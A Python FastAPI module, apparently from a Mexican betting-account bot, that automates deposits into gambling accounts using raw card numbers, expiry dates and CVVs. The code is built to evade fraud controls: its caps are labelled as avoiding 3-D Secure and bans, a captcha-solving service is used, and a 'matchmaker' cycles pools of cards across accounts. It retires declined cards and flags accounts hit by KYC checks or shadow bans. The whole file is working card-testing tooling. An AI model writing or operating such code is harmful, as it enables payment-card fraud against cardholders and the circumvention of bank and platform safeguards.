"""Depósitos — endpoint que reusa el core de v1 (_run_deposit) si está disponible.

En el VPS, los módulos del bot viven en /opt/betmexico/bot/ y son visibles porque
el systemd unit declara WorkingDirectory=/opt/betmexico/bot. En dev local estos
imports fallan y el endpoint devuelve 503.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import time
import uuid
from datetime import datetime, timedelta, timezone
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import StreamingResponse

from auth import require_session

logger = logging.getLogger("betmexico.dashboard.deposits")
router = APIRouter(prefix="/api/deposits", tags=["deposits"])

# Caps duros (anti 3DS, anti-baneo)
DEP_MAX_PER_TXN = 499.0   # >$499 dispara 3DS prácticamente garantizado
DEP_MAX_24H = 1499.0      # tope acumulado por cuenta en 24h vía dashboard


def _window_status(email: str) -> dict:
    """Estado de la ventana de 24h desde el PRIMER depósito aprobado.
    - Si no hay deps aprobados en últimas 24h → window cerrada, disponible $1499
    - Si hay → window abierta, expires_at = first_at + 24h, available = 1499 - used
    """
    from app import db
    import sqlite3
    out = {
        "used": 0.0, "available": DEP_MAX_24H,
        "first_at": None, "expires_at": None, "in_window": False,
    }
    try:
        with db() as c:
            rows = c.execute(
                "SELECT created_at, amount FROM deposit_attempts "
                "WHERE account_email=? AND status='approved' "
                "AND created_at >= datetime('now','-24 hours') "
                "ORDER BY created_at ASC",
                (email,),
            ).fetchall()
    except sqlite3.OperationalError:
        return out
    if not rows:
        return out
    # Parse fechas (sqlite str → datetime UTC naive)
    def _parse(s):
        try:
            return datetime.fromisoformat(s.replace(" ", "T").replace("Z", "+00:00"))
        except Exception:
            return None
    first_at = _parse(rows[0]["created_at"])
    if not first_at:
        return out
    if first_at.tzinfo is None:
        first_at = first_at.replace(tzinfo=timezone.utc)
    expires_at = first_at + timedelta(hours=24)
    used = sum(float(r["amount"] or 0) for r in rows)
    out.update({
        "used": used, "available": max(0.0, DEP_MAX_24H - used),
        "first_at": first_at.isoformat(), "expires_at": expires_at.isoformat(),
        "in_window": True,
    })
    return out


def _check_caps(email: str, amount: float, projected_extra: float = 0.0) -> Optional[str]:
    """Devuelve string de error si viola cap, None si OK.
    `projected_extra` = monto adicional ya proyectado (ej. schedule: amount * reps_extra)."""
    if amount > DEP_MAX_PER_TXN:
        return f"Máximo ${DEP_MAX_PER_TXN:.0f} por intento (>${DEP_MAX_PER_TXN:.0f} dispara 3DS)"
    win = _window_status(email)
    needed = amount + projected_extra
    if needed > win["available"]:
        if win["in_window"]:
            return (f"Excede cap 24h. Ya depositados ${win['used']:.2f}, "
                    f"disponible ${win['available']:.2f}. La window cierra a las "
                    f"{win['expires_at'][:16].replace('T',' ')} UTC")
        return f"Excede cap por txn ${DEP_MAX_PER_TXN:.0f} (intentas ${needed:.2f})"
    return None


def _load_deps():
    """Reusa deps ya cargadas eager en app.py (evita circular imports)."""
    try:
        from app import BOT_RUN_DEPOSIT, BOT_MAKE_POOL, BOT_DEPS_OK
        if BOT_DEPS_OK and BOT_RUN_DEPOSIT and BOT_MAKE_POOL:
            return BOT_RUN_DEPOSIT, BOT_MAKE_POOL
    except Exception as e:
        logger.warning(f"[Deposits] deps no disponibles: {e}")
    return None, None


def _parse_pipe(pipe: str) -> tuple[str, str, str]:
    """Acepta:
      - 4242424242424242|1228|123     (MMYY junto)
      - 4242424242424242|12/28|123    (legacy con diagonal)
      - 4242424242424242|12|28|123    (4 partes)
    Retorna (ccnum, "MM/YY", cvv) — el formato interno con diagonal es
    el que espera el core de v1; el operador NO ve esto.
    """
    parts = [p.strip() for p in (pipe or "").replace(" ", "").split("|") if p.strip()]
    if len(parts) == 3:
        ccnum, exp, cvv = parts
        if "/" in exp:
            return ccnum, exp, cvv
        # MMYY o MMYYYY → MM/YY
        if len(exp) == 4:
            return ccnum, f"{exp[:2]}/{exp[2:]}", cvv
        if len(exp) == 6:
            return ccnum, f"{exp[:2]}/{exp[4:]}", cvv
        raise ValueError("Vencimiento inválido (usa MMYY)")
    if len(parts) == 4:
        return parts[0], f"{parts[1]}/{parts[2][-2:]}", parts[3]
    raise ValueError("Formato pipe inválido. Usa: numero|MMYY|CVV")


def _record_attempt(
    attempt_id: str,
    email: str,
    amount: float,
    status: str,
    rejection_reason: Optional[str],
    duration_ms: int,
    operator_id: int,
    card_pipe: Optional[str] = None,
) -> None:
    """Broadcast SSE para el feed de Actividad.

    NO escribe en BD. El INSERT en deposit_attempts lo hace
    `web_routes_deposits._persist_final` via `db.log_attempt(...)` con info
    completa (card_id, card_pipe, gateway_response_raw, txn_id, etc.).
    Tener 2 INSERT en paralelo causaba duplicación en el feed (2026-05-11)."""
    from app import _broadcast
    now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    try:
        _broadcast({
            "type": "activity",
            "kind": "deposit",
            "ts": now_str,
            "who": operator_id,
            "target": email,
            "amount": amount,
            "status": status,
            "reason": rejection_reason,
            "duration_ms": duration_ms,
            "card_pipe": card_pipe,
        })
    except Exception:
        pass


@router.post("/execute")
async def deposit_execute(request: Request, user: dict = Depends(require_session)):
    _run_deposit, make_pool = _load_deps()
    if _run_deposit is None or make_pool is None:
        raise HTTPException(503, "Módulo de depósitos no disponible en este entorno")

    body = await request.json()
    try:
        account_id = int(body.get("account_id") or 0)
        amount = float(body.get("amount") or 0)
        card_pipe = (body.get("card_pipe") or "").strip()
    except (TypeError, ValueError):
        raise HTTPException(400, "Campos inválidos")

    if not account_id or not card_pipe or amount <= 0:
        raise HTTPException(400, "Faltan campos: account_id, card_pipe, amount")

    if amount < 1 or amount > DEP_MAX_PER_TXN:
        raise HTTPException(400, f"Monto fuera de rango (1-{DEP_MAX_PER_TXN:.0f})")

    try:
        cc_num, cc_exp, cc_cvv = _parse_pipe(card_pipe)
    except ValueError as e:
        raise HTTPException(400, str(e))

    # Lookup cuenta
    from app import db
    with db() as c:
        row = c.execute(
            "SELECT id, email, password FROM accounts WHERE id=? LIMIT 1",
            (account_id,),
        ).fetchone()
    if not row:
        raise HTTPException(404, "Cuenta no encontrada")

    email = row["email"]
    password = row["password"]
    operator_id = int(user.get("telegram_id") or 0)
    attempt_id = uuid.uuid4().hex

    # Cap check
    cap_err = _check_caps(email, amount)
    if cap_err:
        raise HTTPException(400, cap_err)

    # Pool de captcha — start_factory arranca workers (rápido, no bloquea).
    # NO awaiteamos prefetch: si get_jwt usa caché, ni token necesita; si no,
    # factory está produciendo en background y get_token() espera al primero.
    cap_key = os.environ.get("CAPMONSTER_KEY", "") or os.environ.get("BMX_CAPMONSTER_KEY", "")
    pool = None
    prefetch_task = None
    t0 = time.time()
    try:
        pool = make_pool(cap_key, size=1, workers=1)
        await pool.start_factory()
        # Prefetch en background — útil si no hay JWT cacheado, gratis si sí lo hay
        prefetch_task = asyncio.create_task(pool.prefetch(1))

        result = await _run_deposit(
            email=email,
            password=password,
            cc_num=cc_num,
            cc_exp=cc_exp,
            cc_cvv=cc_cvv,
            amount=amount,
            user={"telegram_id": operator_id, "username": user.get("username", "")},
            pool=pool,
            save_card=True,
            check_marriage=False,
        )
    except Exception as e:
        logger.error(f"[Deposits] {email} ${amount}: {e}")
        duration_ms = int((time.time() - t0) * 1000)
        _record_attempt(attempt_id, email, amount, "error", str(e)[:300], duration_ms, operator_id, card_pipe=card_pipe)
        raise HTTPException(500, f"Error: {str(e)[:200]}")
    finally:
        if prefetch_task is not None and not prefetch_task.done():
            prefetch_task.cancel()
            try:
                await prefetch_task
            except (asyncio.CancelledError, Exception):
                pass
        if pool is not None:
            try:
                await pool.stop()
            except Exception:
                pass

    duration_ms = int((time.time() - t0) * 1000)
    success = bool(result.get("success"))
    status = "approved" if success else "rejected"
    reason = result.get("error") or result.get("result_code")

    _record_attempt(attempt_id, email, amount, status, reason, duration_ms, operator_id, card_pipe=card_pipe)

    return {
        "success": success,
        "result_code": result.get("result_code"),
        "error": result.get("error"),
        "duration_ms": duration_ms,
        "attempt_id": attempt_id,
    }


@router.get("/cap-status/{account_id}")
def cap_status(account_id: int, _user: dict = Depends(require_session)):
    """Estado del cap de 24h para una cuenta — para mostrar en el modal."""
    from app import db
    with db() as c:
        row = c.execute("SELECT email FROM accounts WHERE id=?", (account_id,)).fetchone()
    if not row:
        raise HTTPException(404, "Cuenta no encontrada")
    win = _window_status(row["email"])
    return {
        "max_per_txn": DEP_MAX_PER_TXN,
        "max_24h": DEP_MAX_24H,
        **win,
    }


# ── Multicuenta (Matchmaker) ─────────────────────────────────────────────────
# Pool de tarjetas vs N cuentas (max 5). Algoritmo:
#  - 5s cooldown por tarjeta y por cuenta
#  - 2 fails por tarjeta → retirada; 2 fails por cuenta → retirada
#  - 3DS_REQUIRED solo strike a tarjeta, NO a cuenta
#  - LOGIN_FAILED/AUTOEXCLUSION/KYC_PENDING/3DS_UNDETECTED → cuenta DEAD
#  - Tarjeta éxitosa NO se retira (sigue probando otras cuentas)
#  - Par (card, account) sólo se intenta una vez

MM_COOLDOWN = 5
MM_MAX_FAILS = 2

# Runs activos del matchmaker — para soporte de cancelación
_active_mm_runs: dict[str, asyncio.Event] = {}


@router.post("/multi/stream")
async def multi_stream(request: Request, user: dict = Depends(require_session)):
    _run_deposit, make_pool = _load_deps()
    if _run_deposit is None or make_pool is None:
        raise HTTPException(503, "Módulo de depósitos no disponible")

    body = await request.json()
    account_ids = list(body.get("account_ids") or [])[:5]
    cards_raw = list(body.get("cards") or [])[:10]
    amount = float(body.get("amount") or 50)

    if not account_ids:
        raise HTTPException(400, "account_ids requerido")
    if not cards_raw:
        raise HTTPException(400, "cards requerido")
    if amount <= 0 or amount > DEP_MAX_PER_TXN:
        raise HTTPException(400, f"Monto debe ser entre $1 y ${DEP_MAX_PER_TXN:.0f}")

    # Parsea tarjetas
    cards: list[dict] = []
    for cp in cards_raw:
        try:
            num, exp, cvv = _parse_pipe(cp)
            cards.append({
                "num": num, "exp": exp, "cvv": cvv,
                "tail": f"···{num[-4:]}", "pipe": cp,
                "fail_count": 0, "last_used": 0.0, "retired": False,
            })
        except ValueError:
            pass

    if not cards:
        raise HTTPException(400, "Ninguna tarjeta válida")

    from app import db, _broadcast
    placeholders = ",".join("?" * len(account_ids))
    with db() as c:
        rows = c.execute(
            f"SELECT id, email, password FROM accounts WHERE id IN ({placeholders})",
            account_ids,
        ).fetchall()
    accounts = [{
        "id": r["id"], "email": r["email"], "password": r["password"],
        "fail_count": 0, "last_used": 0.0, "done": False,
    } for r in rows]

    if not accounts:
        raise HTTPException(404, "Ninguna cuenta encontrada")

    # Cap check por cuenta — si alguna está full, abortar antes de empezar
    cap_errors = []
    for a in accounts:
        err = _check_caps(a["email"], amount)
        if err:
            cap_errors.append(f"{a['email']}: {err}")
    if cap_errors:
        raise HTTPException(400, "Caps violados:\n" + "\n".join(cap_errors))

    operator_id = int(user.get("telegram_id") or 0)
    user_ctx = {"telegram_id": operator_id, "username": user.get("username", "")}
    cap_key = os.environ.get("CAPMONSTER_KEY", "") or os.environ.get("BMX_CAPMONSTER_KEY", "")

    run_id = uuid.uuid4().hex[:10]
    cancel_event = asyncio.Event()
    _active_mm_runs[run_id] = cancel_event

    async def gen():
        pool = make_pool(cap_key, size=max(2, len(cards)), workers=1)
        await pool.start_factory()
        prefetch = asyncio.create_task(pool.prefetch(min(len(accounts), len(cards))))

        tried: set[tuple[str, int]] = set()  # (card_num, account_id)
        matches: list[dict] = []
        attempts = 0

        yield f"data: {json.dumps({'type':'start','run_id':run_id,'accounts':len(accounts),'cards':len(cards),'amount':amount})}\n\n"

        async def attempt(acc, card, n):
            nonlocal attempts
            email = acc["email"]
            t0 = time.time()
            try:
                r = await _run_deposit(
                    email=email, password=acc["password"],
                    cc_num=card["num"], cc_exp=card["exp"], cc_cvv=card["cvv"],
                    amount=amount, user=user_ctx, pool=pool,
                    save_card=True, check_marriage=False,
                )
            except Exception as e:
                logger.error(f"[Matchmaker] {email}/{card['tail']}: {e}")
                r = {"success": False, "result_code": "ERROR", "error": str(e)[:200]}
            duration = int((time.time() - t0) * 1000)
            ok = bool(r.get("success"))
            _record_attempt(
                uuid.uuid4().hex, email, amount,
                "approved" if ok else "rejected",
                r.get("error") or r.get("result_code"),
                duration, operator_id,
                card_pipe=card.get("pipe"),
            )
            return r, duration

        try:
            while True:
                if cancel_event.is_set():
                    yield f"data: {json.dumps({'type':'cancelled','run_id':run_id})}\n\n"
                    break
                # Retira tarjetas con max fails
                for c in cards:
                    if not c["retired"] and c["fail_count"] >= MM_MAX_FAILS:
                        c["retired"] = True
                        yield f"data: {json.dumps({'type':'card_retired','tail':c['tail'],'fails':c['fail_count']})}\n\n"

                live_cards = [c for c in cards if not c["retired"]]
                live_accs  = [a for a in accounts if not a["done"] and a["fail_count"] < MM_MAX_FAILS]
                if not live_cards or not live_accs:
                    break

                # Construye batch greedy: 1 card + 1 account, no busy, no cooldown, no tried
                now = asyncio.get_event_loop().time()
                batch: list[tuple[dict, dict, int]] = []
                used_cards = set()
                used_accs = set()
                # Prioriza cuentas no atendidas aún
                live_accs.sort(key=lambda a: (a["fail_count"], a["last_used"]))
                for acc in live_accs:
                    if acc["email"] in used_accs:
                        continue
                    if now - acc["last_used"] < MM_COOLDOWN and acc["last_used"] > 0:
                        continue
                    for card in live_cards:
                        if card["num"] in used_cards:
                            continue
                        if (card["num"], acc["id"]) in tried:
                            continue
                        if now - card["last_used"] < MM_COOLDOWN and card["last_used"] > 0:
                            continue
                        attempts += 1
                        batch.append((acc, card, attempts))
                        used_cards.add(card["num"])
                        used_accs.add(acc["email"])
                        break

                if not batch:
                    # Verifica si hay pares posibles aún
                    pairs_left = any(
                        (c["num"], a["id"]) not in tried
                        for c in live_cards for a in live_accs
                    )
                    if not pairs_left:
                        break
                    # Espera el cooldown mínimo
                    waits = []
                    for c in live_cards:
                        if c["last_used"] > 0:
                            waits.append(MM_COOLDOWN - (now - c["last_used"]))
                    for a in live_accs:
                        if a["last_used"] > 0:
                            waits.append(MM_COOLDOWN - (now - a["last_used"]))
                    waits = [w for w in waits if w > 0]
                    if not waits:
                        break
                    wait = min(waits)
                    yield f"data: {json.dumps({'type':'cooldown','wait':round(wait,1)})}\n\n"
                    await asyncio.sleep(min(wait, 2.0))
                    continue

                # Emite trying y lanza paralelo
                for acc, card, n in batch:
                    yield f"data: {json.dumps({'type':'trying','email':acc['email'],'tail':card['tail'],'attempt':n})}\n\n"

                tasks = [asyncio.create_task(attempt(acc, card, n)) for acc, card, n in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                for (acc, card, n), res in zip(batch, results):
                    tried.add((card["num"], acc["id"]))
                    now2 = asyncio.get_event_loop().time()
                    card["last_used"] = now2
                    acc["last_used"] = now2

                    if isinstance(res, Exception):
                        yield f"data: {json.dumps({'type':'error','email':acc['email'],'tail':card['tail'],'message':str(res)[:200]})}\n\n"
                        continue
                    r, duration = res
                    code = r.get("result_code", "UNKNOWN")
                    ok = bool(r.get("success"))

                    if ok:
                        acc["done"] = True
                        card["retired"] = True  # tarjeta se casa con la cuenta — nunca más se prueba en otras
                        matches.append({"email": acc["email"], "tail": card["tail"], "pipe": card["pipe"]})
                        yield f"data: {json.dumps({'type':'match','email':acc['email'],'tail':card['tail'],'pipe':card['pipe'],'amount':amount,'duration_ms':duration,'attempt':n})}\n\n"
                    elif code in ("LOGIN_FAILED", "AUTOEXCLUSION", "KYC_PENDING", "3DS_UNDETECTED", "SHADOW_BAN?"):
                        # Cuenta fuera del run + persistir DEAD en BD para no volver a intentarla
                        acc["fail_count"] = MM_MAX_FAILS
                        try:
                            from app import db as _appdb
                            with _appdb(write=True) as cdb:
                                cdb.execute(
                                    "UPDATE accounts SET status='DEAD', dead_reason=?, dead_at=? "
                                    "WHERE email=? AND status != 'DEAD'",
                                    (code, datetime.now(timezone.utc).isoformat(), acc["email"])
                                )
                        except Exception as ex:
                            logger.error(f"[Matchmaker] no pude marcar DEAD {acc['email']}: {ex}")
                        yield f"data: {json.dumps({'type':'account_dead','email':acc['email'],'code':code,'tail':card['tail'],'attempt':n,'persisted':True})}\n\n"
                    elif code in ("3DS_REQUIRED", "BANK_REJECTED"):
                        # Solo strike a tarjeta — la cuenta está fina (BANK_REJECTED viene del banco
                        # emisor de la tarjeta, no de BetMexico)
                        card["fail_count"] += 1
                        yield f"data: {json.dumps({'type':'rejected','email':acc['email'],'tail':card['tail'],'code':code,'card_fails':card['fail_count'],'attempt':n,'card_only':True})}\n\n"
                    else:
                        card["fail_count"] += 1
                        acc["fail_count"] += 1
                        yield f"data: {json.dumps({'type':'rejected','email':acc['email'],'tail':card['tail'],'code':code,'card_fails':card['fail_count'],'acct_fails':acc['fail_count'],'attempt':n})}\n\n"

                # Notifica al SSE global del activity feed
                for m in matches[-len(batch):]:
                    try:
                        _broadcast({
                            "type": "activity", "kind": "deposit",
                            "ts": datetime.now(timezone.utc).isoformat(),
                            "who": operator_id, "target": m["email"],
                            "amount": amount, "status": "approved",
                        })
                    except Exception:
                        pass
        finally:
            if not prefetch.done():
                prefetch.cancel()
            try:
                await pool.stop()
            except Exception:
                pass
            _active_mm_runs.pop(run_id, None)

        yield f"data: {json.dumps({'type':'done','matches':len(matches),'attempts':attempts,'pending':sum(1 for a in accounts if not a['done'] and a['fail_count']<MM_MAX_FAILS)})}\n\n"

    return StreamingResponse(gen(), media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@router.post("/multi/{run_id}/cancel")
def multi_cancel(run_id: str, _user: dict = Depends(require_session)):
    ev = _active_mm_runs.get(run_id)
    if not ev:
        raise HTTPException(404, "Run no encontrado o ya terminado")
    ev.set()
    return {"cancelled": run_id}


# ── Programado ──────────────────────────────────────────────────────────────
# 1 tarjeta → 1 cuenta, N repeticiones (max 20) cada 60s.
# Cancela auto en LOGIN_FAILED / AUTOEXCLUSION / KYC_PENDING.

_active_schedules: dict = {}


@router.post("/scheduled/create")
async def scheduled_create(request: Request, user: dict = Depends(require_session)):
    _run_deposit, make_pool = _load_deps()
    if _run_deposit is None or make_pool is None:
        raise HTTPException(503, "Módulo de depósitos no disponible")

    body = await request.json()
    account_id = int(body.get("account_id") or 0)
    card_pipe = (body.get("card_pipe") or "").strip()
    amount = float(body.get("amount") or 50)
    repetitions = max(1, min(20, int(body.get("repetitions") or 5)))
    interval = 60

    if not account_id or not card_pipe:
        raise HTTPException(400, "account_id y card_pipe requeridos")
    if amount <= 0 or amount > DEP_MAX_PER_TXN:
        raise HTTPException(400, f"Monto debe ser entre $1 y ${DEP_MAX_PER_TXN:.0f}")
    try:
        cc_num, cc_exp, cc_cvv = _parse_pipe(card_pipe)
    except ValueError as e:
        raise HTTPException(400, str(e))

    from app import db, _broadcast
    with db() as c:
        row = c.execute(
            "SELECT id, email, password FROM accounts WHERE id=?", (account_id,)
        ).fetchone()
    if not row:
        raise HTTPException(404, "Cuenta no encontrada")

    sched_id = uuid.uuid4().hex[:10]
    operator_id = int(user.get("telegram_id") or 0)
    email = row["email"]
    password = row["password"]
    cap_key = os.environ.get("CAPMONSTER_KEY", "") or os.environ.get("BMX_CAPMONSTER_KEY", "")

    async def loop():
        pool = make_pool(cap_key, size=1, workers=1)
        await pool.start_factory()
        asyncio.create_task(pool.prefetch(1))
        try:
            for i in range(repetitions):
                t0 = time.time()
                try:
                    r = await _run_deposit(
                        email=email, password=password,
                        cc_num=cc_num, cc_exp=cc_exp, cc_cvv=cc_cvv,
                        amount=amount,
                        user={"telegram_id": operator_id, "username": user.get("username", "")},
                        pool=pool, save_card=True, check_marriage=False,
                    )
                except Exception as e:
                    logger.error(f"[Scheduled {sched_id}] {email}: {e}")
                    r = {"success": False, "result_code": "ERROR", "error": str(e)[:200]}
                duration = int((time.time() - t0) * 1000)
                ok = bool(r.get("success"))
                code = r.get("result_code", "UNKNOWN")
                _record_attempt(
                    uuid.uuid4().hex, email, amount,
                    "approved" if ok else "rejected",
                    r.get("error") or code, duration, operator_id,
                    card_pipe=card_pipe,
                )
                _broadcast({
                    "type": "activity", "kind": "scheduled",
                    "sched_id": sched_id, "iter": i + 1, "total": repetitions,
                    "email": email, "amount": amount,
                    "success": ok, "code": code,
                    "ts": datetime.now(timezone.utc).isoformat(),
                    "who": operator_id,
                })
                # Cualquier falla aborta el loop completo: no tiene sentido
                # reintentar el mismo monto que ya rechazó (quema cuentas).
                if not ok:
                    _broadcast({
                        "type": "activity", "kind": "scheduled_aborted",
                        "sched_id": sched_id, "email": email, "code": code,
                        "iter": i + 1, "total": repetitions,
                        "ts": datetime.now(timezone.utc).isoformat(),
                    })
                    break
                if i < repetitions - 1:
                    await asyncio.sleep(interval)
        except asyncio.CancelledError:
            _broadcast({
                "type": "activity", "kind": "scheduled_cancelled",
                "sched_id": sched_id, "email": email,
                "ts": datetime.now(timezone.utc).isoformat(),
            })
            raise
        finally:
            try:
                await pool.stop()
            except Exception:
                pass
            _active_schedules.pop(sched_id, None)

    task = asyncio.create_task(loop())
    _active_schedules[sched_id] = {
        "task": task, "email": email,
        "amount": amount, "repetitions": repetitions,
        "operator_id": operator_id,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }
    return {"sched_id": sched_id, "email": email, "repetitions": repetitions}


@router.get("/scheduled/list")
def scheduled_list(user: dict = Depends(require_session)):
    tg = int(user.get("telegram_id") or 0)
    is_sa = user.get("role") == "superadmin"
    out = []
    for sid, info in list(_active_schedules.items()):
        if info["task"].done():
            _active_schedules.pop(sid, None)
            continue
        if not is_sa and info["operator_id"] != tg:
            continue
        out.append({
            "sched_id": sid, "email": info["email"],
            "amount": info["amount"], "repetitions": info["repetitions"],
            "started_at": info["started_at"],
        })
    return out


@router.post("/scheduled/{sched_id}/cancel")
def scheduled_cancel(sched_id: str, user: dict = Depends(require_session)):
    info = _active_schedules.get(sched_id)
    if not info:
        raise HTTPException(404, "Misión no encontrada")
    tg = int(user.get("telegram_id") or 0)
    if user.get("role") != "superadmin" and info["operator_id"] != tg:
        raise HTTPException(403, "No es tuya")
    info["task"].cancel()
    return {"cancelled": sched_id}
